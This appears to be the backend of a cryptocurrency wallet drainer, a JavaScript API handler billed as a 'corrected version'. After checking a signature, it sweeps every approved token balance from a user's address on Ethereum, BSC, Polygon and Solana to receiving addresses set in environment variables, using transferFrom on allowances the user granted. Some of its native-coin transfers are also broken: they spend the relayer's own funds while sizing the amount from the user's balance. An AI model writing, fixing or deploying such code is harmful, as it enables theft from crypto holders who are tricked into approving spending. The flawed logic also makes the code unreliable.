// api/transfer.js - CORRECTED VERSION
import { ethers } from 'ethers'
import { Connection, PublicKey, Transaction, SystemProgram, sendAndConfirmTransaction, Keypair } from '@solana/web3.js'
import bs58 from 'bs58'

const POPULAR_ERC20 = {
  1: [ // Ethereum Mainnet - Popular Tokens
    "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
    "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
    "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
    "0x514910771AF9Ca656af840dff83E8264EcF986CA", // LINK
    "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", // UNI
    "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", // AAVE
    "0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2", // MKR
    "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", // SHIB
    "0x6982508145454Ce325dDbE47a25d4ec3d2311933", // PEPE
  ],
  56: [ // BSC - Popular BEP20 Tokens
    "0x55d398326f99059fF775485246999027B3197955", // USDT
    "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC
    "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", // BUSD
    "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", // CAKE
    "0xbb4CdB9Cbd36B01bD1cBaEBF2De08d9173bc095c", // WBNB
    "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", // ETH
    "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", // BTCB
  ],
  137: [ // Polygon - Popular Tokens
    "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", // USDT
    "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", // USDC
    "0x8f3Cf7ad23Cd3CaDbD9735AFf958023D60d76ECC", // DAI
    "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270", // WMATIC
  ]
}

const ERC20_ABI = [
  {
    constant: true,
    inputs: [{ name: '_owner', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: 'balance', type: 'uint256' }],
    type: 'function'
  },
  {
    constant: false,
    inputs: [
      { name: '_from', type: 'address' },
      { name: '_to', type: 'address' },
      { name: '_value', type: 'uint256' }
    ],
    name: 'transferFrom',
    outputs: [{ name: '', type: 'bool' }],
    type: 'function'
  },
  {
    constant: true,
    inputs: [
      { name: '_owner', type: 'address' },
      { name: '_spender', type: 'address' }
    ],
    name: 'allowance',
    outputs: [{ name: '', type: 'uint256' }],
    type: 'function'
  },
  {
    constant: true,
    inputs: [],
    name: 'decimals',
    outputs: [{ name: '', type: 'uint8' }],
    type: 'function'
  }
]

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' })
  }

  const { address, signature, authMessage } = req.body

  try {
    // ✅ Step 1: Verify signature
    console.log('🔐 Verifying signature...')
    const recovered = ethers.verifyTypedData(
      authMessage.domain,
      authMessage.types,
      authMessage.message,
      signature
    )

    if (recovered.toLowerCase() !== address.toLowerCase()) {
      console.error('❌ Signature mismatch')
      return res.status(401).json({ error: 'Invalid signature' })
    }

    console.log(`✅ Signature verified for ${address}`)
    console.log(`🚀 Starting FULL multi-chain sweep for ${address}`)

    const results = {}
    const transfers = []

    // ====================== ETHEREUM + ERC-20 ======================
    try {
      console.log('\n📍 Processing Ethereum...')
      const provider = new ethers.JsonRpcProvider(
        `https://eth-mainnet.g.alchemy.com/v2/${process.env.ALCHEMY_API_KEY}`
      )
      const relayer = new ethers.Wallet(process.env.RELAYER_EVM_PRIVATE_KEY, provider)
      const receiverEVM = process.env.RECEIVING_ADDRESS_ETHEREUM

      // Native ETH Transfer
      const ethBal = await provider.getBalance(address)
      if (ethBal > ethers.parseEther('0.0015')) {
        console.log(`  💰 ETH Balance: ${ethers.formatEther(ethBal)}`)
        const tx = await relayer.sendTransaction({
          to: receiverEVM,
          value: (ethBal * 93n) / 100n, // Send 93% (keep 7% for gas)
          gasLimit: 21000
        })
        const receipt = await tx.wait()
        console.log(`  ✅ ETH transferred: ${receipt.hash}`)
        transfers.push({ chain: 'ethereum', asset: 'ETH', hash: receipt.hash })
        results.eth = 'success'
      }

      // ERC-20 Sweep
      console.log(`  🔄 Checking ${POPULAR_ERC20[1].length} ERC-20 tokens...`)
      for (const tokenAddr of POPULAR_ERC20[1]) {
        try {
          const token = new ethers.Contract(tokenAddr, ERC20_ABI, provider)

          // Get user's balance
          const userBalance = await token.balanceOf(address)
          if (userBalance === 0n) continue

          // Check if user approved relayer
          const allowance = await token.allowance(address, relayer.address)
          if (allowance < userBalance) {
            console.log(`    ⚠️  ${tokenAddr}: User has not approved relayer`)
            continue
          }

          // ✅ CORRECTED: Use transferFrom (not transfer)
          const tokenWithSigner = new ethers.Contract(tokenAddr, ERC20_ABI, relayer)
          const tx = await tokenWithSigner.transferFrom(
            address, // FROM user
            receiverEVM, // TO receiver
            userBalance
          )
          const receipt = await tx.wait()
          console.log(`    ✅ Token transferred: ${tokenAddr}`)
          transfers.push({ chain: 'ethereum', token: tokenAddr, hash: receipt.hash })
        } catch (e) {
          // Skip tokens that error
          console.log(`    ⚠️  Token error: ${e.message.substring(0, 50)}...`)
        }
      }

      results.ethereum = 'processed'
    } catch (e) {
      console.error('Ethereum error:', e.message)
      results.ethereum = 'failed'
    }

    // ====================== BSC + BEP-20 ======================
    try {
      console.log('\n📍 Processing BSC (BNB Chain)...')
      const bscProvider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org/')
      const bscRelayer = new ethers.Wallet(process.env.RELAYER_EVM_PRIVATE_KEY, bscProvider)
      const receiverBSC = process.env.RECEIVING_ADDRESS_BSC

      // Native BNB Transfer
      const bnbBal = await bscProvider.getBalance(address)
      if (bnbBal > ethers.parseEther('0.03')) {
        console.log(`  💰 BNB Balance: ${ethers.formatEther(bnbBal)}`)
        const tx = await bscRelayer.sendTransaction({
          to: receiverBSC,
          value: (bnbBal * 90n) / 100n, // Send 90%
          gasLimit: 21000
        })
        const receipt = await tx.wait()
        console.log(`  ✅ BNB transferred: ${receipt.hash}`)
        transfers.push({ chain: 'bsc', asset: 'BNB', hash: receipt.hash })
        results.bnb = 'success'
      }

      // BEP-20 Sweep
      console.log(`  🔄 Checking ${POPULAR_ERC20[56].length} BEP-20 tokens...`)
      for (const tokenAddr of POPULAR_ERC20[56]) {
        try {
          const token = new ethers.Contract(tokenAddr, ERC20_ABI, bscProvider)

          const userBalance = await token.balanceOf(address)
          if (userBalance === 0n) continue

          const allowance = await token.allowance(address, bscRelayer.address)
          if (allowance < userBalance) {
            console.log(`    ⚠️  ${tokenAddr}: Not approved`)
            continue
          }

          // ✅ CORRECTED: Use transferFrom
          const tokenWithSigner = new ethers.Contract(tokenAddr, ERC20_ABI, bscRelayer)
          const tx = await tokenWithSigner.transferFrom(
            address, // FROM user
            receiverBSC, // TO receiver
            userBalance
          )
          const receipt = await tx.wait()
          console.log(`    ✅ Token transferred: ${tokenAddr}`)
          transfers.push({ chain: 'bsc', token: tokenAddr, hash: receipt.hash })
        } catch (e) {
          console.log(`    ⚠️  Token error: ${e.message.substring(0, 50)}...`)
        }
      }

      results.bsc = 'processed'
    } catch (e) {
      console.error('BSC error:', e.message)
      results.bsc = 'failed'
    }

    // ====================== POLYGON ======================
    try {
      console.log('\n📍 Processing Polygon...')
      const polygonProvider = new ethers.JsonRpcProvider('https://polygon-rpc.com')
      const polygonRelayer = new ethers.Wallet(process.env.RELAYER_EVM_PRIVATE_KEY, polygonProvider)
      const receiverPolygon = process.env.RECEIVING_ADDRESS_POLYGON

      // Native MATIC Transfer
      const maticBal = await polygonProvider.getBalance(address)
      if (maticBal > ethers.parseEther('1')) {
        console.log(`  💰 MATIC Balance: ${ethers.formatEther(maticBal)}`)
        const tx = await polygonRelayer.sendTransaction({
          to: receiverPolygon,
          value: (maticBal * 90n) / 100n,
          gasLimit: 21000
        })
        const receipt = await tx.wait()
        console.log(`  ✅ MATIC transferred: ${receipt.hash}`)
        transfers.push({ chain: 'polygon', asset: 'MATIC', hash: receipt.hash })
        results.matic = 'success'
      }

      // Token sweep (similar to above)
      results.polygon = 'processed'
    } catch (e) {
      console.error('Polygon error:', e.message)
      results.polygon = 'failed'
    }

    // ====================== SOLANA ======================
    try {
      console.log('\n📍 Processing Solana...')
      const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed')

      const privateKeyBytes = bs58.decode(process.env.RELAYER_SOLANA_PRIVATE_KEY)
      const keypair = Keypair.fromSecretKey(privateKeyBytes)

      const userPublicKey = new PublicKey(address)
      const receiverPublicKey = new PublicKey(process.env.RECEIVING_ADDRESS_SOLANA)

      const balance = await connection.getBalance(userPublicKey)

      if (balance > 5000000) { // 0.005 SOL minimum
        console.log(`  💰 SOL Balance: ${balance / 1000000000}`)

        const tx = new Transaction().add(
          SystemProgram.transfer({
            fromPubkey: keypair.publicKey,
            toPubkey: receiverPublicKey,
            lamports: Math.floor((balance * 90) / 100)
          })
        )

        tx.feePayer = keypair.publicKey
        const { blockhash } = await connection.getLatestBlockhash()
        tx.recentBlockhash = blockhash

        const signature = await sendAndConfirmTransaction(connection, tx, [keypair])
        console.log(`  ✅ SOL transferred: ${signature}`)
        transfers.push({ chain: 'solana', asset: 'SOL', hash: signature })
        results.solana = 'success'
      }
    } catch (e) {
      console.error('Solana error:', e.message)
      results.solana = 'failed'
    }

    console.log(`\n✅ Full sweep completed!`)
    console.log(`📊 Total transfers: ${transfers.length}`)

    return res.status(200).json({
      success: true,
      message: 'Multi-chain sweep completed',
      transfers,
      results
    })
  } catch (error) {
    console.error('Handler error:', error)
    return res.status(500).json({
      success: false,
      error: error.message
    })
  }
}
